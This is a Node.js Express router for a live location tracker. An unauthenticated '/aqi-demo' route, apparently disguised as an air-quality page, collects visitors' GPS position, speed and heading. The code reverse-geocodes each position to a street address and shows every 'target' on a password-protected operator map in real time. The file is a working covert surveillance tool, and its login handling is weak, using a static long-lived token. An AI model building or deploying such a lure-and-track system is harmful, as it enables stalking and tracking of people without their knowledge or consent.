const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}
const lastGeocodeAt = {}
const geocodeInFlight = {}

function distanceMeters(lat1, lng1, lat2, lng2) {
    const toRad = (deg) => deg * Math.PI / 180
    const R = 6371000
    const dLat = toRad(lat2 - lat1)
    const dLng = toRad(lng2 - lng1)
    const a = Math.sin(dLat / 2) ** 2 +
        Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLng / 2) ** 2
    return 2 * R * Math.asin(Math.sqrt(a))
}

async function reverseGeocode(lat, lng) {
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&format=json`
        const response = await fetch(url, {
            headers: {
                "User-Agent": "LiveLocationTracker/1.0 (educational demo)",
                "Accept": "application/json",
            },
        })

        if (!response.ok) return null

        const data = await response.json()
        return data.display_name || null
    } catch (error) {
        console.error("reverse geocode failed:", error.message)
        return null
    }
}

async function handleLocationUpdate(req, res) {
    const {
        id,
        lat,
        lng,
        accuracy = null,
        altitude = null,
        altitudeAccuracy = null,
        speed = null,
        heading = null,
        timestamp = Date.now(),
    } = req.body

    if (!id || lat == null || lng == null) {
        return res.status(400).send("Missing id/lat/lng")
    }

    const isNew = TARGETS[id] == null
    if (isNew) {
        IO.emit("user-connected", id)
    }

    const previous = TARGETS[id] || {}
    const now = Date.now()
    const newAccuracy = accuracy == null ? Number.POSITIVE_INFINITY : Number(accuracy)
    const prevAccuracy = previous.accuracy == null ? Number.POSITIVE_INFINITY : Number(previous.accuracy)

    // Ignore impossible GPS jumps — unless the new reading is a much better GPS fix
    // (common: first point is coarse IP/Wi‑Fi city location, then real GPS arrives)
    if (previous.lat != null && previous.lng != null && previous.updatedAt) {
        const movedMeters = distanceMeters(previous.lat, previous.lng, lat, lng)
        const elapsedSec = Math.max(0.001, (now - previous.updatedAt) / 1000)
        const impliedSpeedKmh = (movedMeters / elapsedSec) * 3.6
        const betterGpsFix = newAccuracy <= 100 && newAccuracy < prevAccuracy * 0.5
        const replacingCoarseFix = prevAccuracy >= 500 && newAccuracy <= 150

        if (movedMeters > 2000 && impliedSpeedKmh > 300 && !betterGpsFix && !replacingCoarseFix) {
            console.log(`> ${id} - ignored jump ${movedMeters.toFixed(0)}m @ ${impliedSpeedKmh.toFixed(0)} km/h (±${newAccuracy}m)`)
            return res.send("IGNORED")
        }
    }

    // Prefer keeping a precise fix over a later coarse network guess
    if (
        previous.lat != null &&
        prevAccuracy <= 100 &&
        newAccuracy >= 500 &&
        distanceMeters(previous.lat, previous.lng, lat, lng) > 500
    ) {
        console.log(`> ${id} - ignored coarse override (±${newAccuracy}m)`)
        return res.send("IGNORED")
    }

    const movedMeters = previous.lat != null
        ? distanceMeters(previous.lat, previous.lng, lat, lng)
        : Infinity

    // Drop stale address when the target moved meaningfully
    const keepAddress = previous.address && movedMeters < 200
    const payload = {
        id,
        lat,
        lng,
        accuracy,
        altitude,
        altitudeAccuracy,
        speed,
        heading,
        timestamp,
        address: keepAddress ? previous.address : null,
        updatedAt: now,
    }

    TARGETS[id] = payload
    IO.emit("map-data", payload)
    res.send("OK")
    const accLabel = accuracy != null ? ` ±${Number(accuracy).toFixed(0)}m` : ""
    console.log(`> ${id} - ${lat}, ${lng}${accLabel} | ${payload.address || "address pending"}`)

    const shouldGeocode = !payload.address || !lastGeocodeAt[id] || (now - lastGeocodeAt[id] > 30000) || movedMeters > 200
    if (!shouldGeocode || geocodeInFlight[id]) return

    lastGeocodeAt[id] = now
    geocodeInFlight[id] = true
    try {
        const address = await reverseGeocode(lat, lng)
        if (!address || !TARGETS[id]) return

        // Don't apply an address to a position that moved far away while waiting
        const stillClose = distanceMeters(TARGETS[id].lat, TARGETS[id].lng, lat, lng) < 300
        if (!stillClose) return

        TARGETS[id] = { ...TARGETS[id], address }
        IO.emit("map-data", TARGETS[id])
        console.log(`> ${id} - address: ${address}`)
    } finally {
        geocodeInFlight[id] = false
    }
}

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

router.route("/aqi-demo").get((req, res) => {
    res.render("aqi-demo")
}).post(handleLocationUpdate)

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    const target = TARGETS[id] || null

    res.render("map", {
        data: JSON.stringify(target)
    })
})


module.exports = router
